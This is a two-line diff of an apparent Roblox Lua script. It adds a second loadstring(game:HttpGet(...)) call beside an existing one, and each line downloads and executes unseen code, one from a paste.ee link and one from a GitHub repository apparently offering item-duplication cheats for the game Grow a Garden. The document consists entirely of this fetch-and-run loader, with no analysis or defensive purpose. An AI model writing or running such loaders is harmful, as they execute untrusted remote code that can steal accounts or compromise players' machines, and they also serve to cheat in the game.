@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("https://paste.ee/r/xFLOo3sB"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrowAGardenScr1pt/DupeSpawner/refs/heads/main/Dupe-EggPredictor"))()
